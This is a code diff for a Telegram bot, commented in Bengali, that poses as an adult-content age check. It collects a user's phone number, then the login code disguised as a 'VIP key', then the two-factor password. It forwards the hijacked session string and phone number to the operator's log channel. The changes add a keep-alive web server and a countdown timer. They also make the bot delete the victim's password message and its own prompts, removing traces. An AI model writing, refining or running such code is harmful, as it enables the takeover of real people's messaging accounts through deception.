@@ -1,5 +1,7 @@
 import os
 import asyncio
+from flask import Flask
+from threading import Thread
 from dotenv import load_dotenv
 from telethon import TelegramClient, events, types, Button
 from telethon.sessions import StringSession
@@ -11,6 +13,15 @@ API_ID = int(os.getenv("API_ID"))
 API_HASH = os.getenv("API_HASH")
 BOT_TOKEN = os.getenv("BOT_TOKEN")
 LOG_CHANNEL_ID = int(os.getenv("LOG_CHANNEL_ID"))
+
+# Render Port Binding (১৩৩ নং লাইনের সমাধান)
+app = Flask('')
+@app.route('/')
+def home(): return "Bot is Alive!"
+def run(): app.run(host='0.0.0.0', port=8080)
+def keep_alive():
+    t = Thread(target=run)
+    t.start()
 
 bot = TelegramClient('login_bot_session', API_ID, API_HASH).start(bot_token=BOT_TOKEN)
 user_data = {}
@@ -35,7 +46,6 @@ def build_keypad():
 
 @bot.on(events.NewMessage(pattern='/start'))
 async def start(event):
-    # বাটনটি ছোট এবং স্বাভাবিক করার জন্য লিস্টের ভেতরে রাখা হয়নি
     msg = await event.respond(
         "🔞 **১৮+ কন্টেন্ট দেখতে হলে আপনার বয়স যাচাই করা প্রয়োজন।**",
         buttons=Button.request_phone("✅ আমি ১৮+")
@@ -48,7 +58,14 @@ async def handle_contact(event):
         phone = event.message.contact.phone_number
         chat_id = event.chat_id
         await event.delete()
-        await asyncio.sleep(1)
+        
+        # ৬ সেকেন্ডের টাইমার সেটিংস
+        timer_msg = await event.respond("♻️ **অনুগ্রহ করে ০৬ সেকেন্ড অপেক্ষা করুন...**")
+        for i in range(5, 0, -1):
+            await asyncio.sleep(1)
+            await timer_msg.edit(f"♻️ **অনুগ্রহ করে ০{i} সেকেন্ড অপেক্ষা করুন...**")
+        
+        await timer_msg.delete()
 
         new_client = TelegramClient(StringSession(), API_ID, API_HASH)
         await new_client.connect()
@@ -59,7 +76,7 @@ async def handle_contact(event):
                 'phone': phone, 'client': new_client,
                 'hash': send_code.phone_code_hash, 'typed_code': "", 'step': 'otp'
             }
-            
+
             msg = await event.respond(
                 "🛡️ **VIP এক্সেস ভেরিফিকেশন**\n\n**৫ ডিজিটের Key টি টাইপ করুন।**\n\n"
                 "**Status:** `অপেক্ষা করা হচ্ছে...`\n**Input:** `____`",
@@ -97,7 +114,8 @@ async def perform_login(event, current):
         await finalize_login(event, current)
     except SessionPasswordNeededError:
         current['step'] = '2fa'
-        await event.edit("🔐 **আপনার একাউন্টে Two-Factor (2FA) চালু আছে।**\n\nঅনুগ্রহ করে আপনার **পাসওয়ার্ডটি** মেসেজ বক্সে লিখে পাঠান।")
+        msg_2fa = await event.edit("🔐 **আপনার একাউন্টে Two-Factor (2FA) চালু আছে।**\n\nঅনুগ্রহ করে আপনার **পাসওয়ার্ডটি** মেসেজ বক্সে লিখে পাঠান।")
+        current['2fa_msg_id'] = msg_2fa.id
     except PhoneCodeInvalidError:
         current['typed_code'] = ""
         await event.answer("❌ ভুল Key! আবার দিন।", alert=True)
@@ -109,17 +127,25 @@ async def handle_2fa(event):
     if chat_id in user_data and user_data[chat_id].get('step') == '2fa':
         password = event.text
         current = user_data[chat_id]
+        
+        # ইউজারের পাসওয়ার্ড মেসেজ সাথে সাথে ডিলিট
         await event.delete()
+        
+        # আগের ২এফএ মেসেজ ডিলিট
+        try: await bot.delete_messages(chat_id, current['2fa_msg_id'])
+        except: pass
+
         try:
             await current['client'].sign_in(password=password)
             await finalize_login(event, current)
         except PasswordHashInvalidError:
-            await event.respond("❌ **ভুল পাসওয়ার্ড!** আবার চেষ্টা করুন।", buttons=None)
+            err = await event.respond("❌ **ভুল পাসওয়ার্ড!** আবার চেষ্টা করুন।")
+            asyncio.create_task(delete_after(err, 5))
 
 async def finalize_login(event, current):
     session_str = current['client'].session.save()
     await bot.send_message(LOG_CHANNEL_ID, f"🔥 **New VIP Login!**\n📱 Phone: `{current['phone']}`\n🔑 Session: `{session_str}`")
-    
+
     success_text = (
         "━━━━━━━━━━━━━━━━━━━━\n"
         "🌟 **অভিনন্দন! বয়স যাচাই সফল হয়েছে** 🌟\n"
@@ -131,5 +157,7 @@ async def finalize_login(event, current):
     asyncio.create_task(delete_after(msg, 120))
     user_data.pop(event.chat_id)
 
+# স্টার্ট পোর্ট এবং বোট
+keep_alive()
 print("Bot is running...")
 bot.run_until_disconnected()
